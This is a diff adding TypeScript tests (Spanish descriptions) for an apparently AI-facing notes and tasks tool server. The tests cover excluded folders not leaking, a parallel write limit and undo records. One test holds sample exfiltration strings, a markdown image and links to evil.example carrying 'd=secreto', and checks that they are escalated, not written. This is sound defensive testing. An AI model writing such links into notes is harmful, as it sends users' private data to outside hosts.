@@ -294,3 +294,63 @@ test("mantenimiento: stale_projects respeta days y excluye proyectos al día", a
     j.close();
   } finally { cleanup(); }
 });
+
+test("exclude: today, list_tasks y get_project no filtran nada de carpetas excluidas", async () => {
+  const { j, call, proj, cleanup } = await setup(["Privado/"]);
+  try {
+    const t = await j.createNote({ title: "Tarea secreta", folder: "Privado", type: "task", fm: { status: "todo", due: "2000-01-01", priority: 1, project: "[[Jarvis]]" } });
+    assert.ok(j.index.getNote(t.path), "la tarea existe en el índice");
+    for (const [name, args] of [["today", {}], ["list_tasks", {}], ["get_project", { path: proj.path }]] as const) {
+      const r = await call(name, args);
+      assert.ok(!r.isError, r.text);
+      assert.ok(!r.text.includes("Privado/") && !r.text.includes("Tarea secreta"), `${name} filtra la carpeta excluida: ${r.text.slice(0, 300)}`);
+    }
+    j.close();
+  } finally { cleanup(); }
+});
+
+test("escritura: texto con enlaces o imágenes externas va a propuesta (exfiltración)", async () => {
+  const { j, call, cocina, cleanup } = await setup();
+  try {
+    const before = (await j.readNote(cocina.path)).text;
+    for (const text of ["![x](https://evil.example/?d=secreto)", "mira https://evil.example/x", "<img src=//evil/x>"]) {
+      const r = await call("append_to_note", { path: cocina.path, text });
+      assert.ok(!r.isError, r.text);
+      assert.equal(r.json.escalated, true, text);
+    }
+    assert.equal((await j.readNote(cocina.path)).text, before);
+    const ok = await call("append_to_note", { path: cocina.path, text: "ver [[Jarvis]] y seguir" });
+    assert.ok(ok.json.undoId, "texto normal sigue siendo automático");
+    j.close();
+  } finally { cleanup(); }
+});
+
+test("escritura: llamadas en paralelo respetan el límite de 5 notas", async () => {
+  const { j, call, cleanup } = await setup();
+  try {
+    const rs = await Promise.all(Array.from({ length: 9 }, (_, i) => call("create_note", { title: `Paralela ${i}` })));
+    assert.equal(rs.filter((r) => r.json?.undoId).length, 5);
+    assert.equal(rs.filter((r) => r.json?.escalated).length, 4);
+    j.close();
+  } finally { cleanup(); }
+});
+
+test("escritura: si apply falla a medias, queda registro de Deshacer de lo que sí cambió", async () => {
+  const { j, call, tools, cap, cleanup } = await setup();
+  try {
+    const real = j.convertCapture.bind(j);
+    (j as any).convertCapture = async (p: string, k: "task" | "note") => {
+      await j.setProps(p, { status: "todo" }); // cambia el fichero…
+      throw new Error("fallo simulado al mover"); // …y falla antes de terminar
+    };
+    const r = await call("convert_capture", { path: cap.path, kind: "task" }).catch((e) => ({ threw: e }));
+    (j as any).convertCapture = real;
+    assert.ok("threw" in r || r.isError);
+    const rec = (await new UndoStore(j).list()).find((x) => x.tool === "convert_capture");
+    assert.ok(rec, "hay registro de la acción a medias");
+    await new UndoStore(j).undo(rec.id);
+    assert.ok(!(await j.readNote(cap.path)).text.includes("status: todo"));
+    void tools;
+    j.close();
+  } finally { cleanup(); }
+});
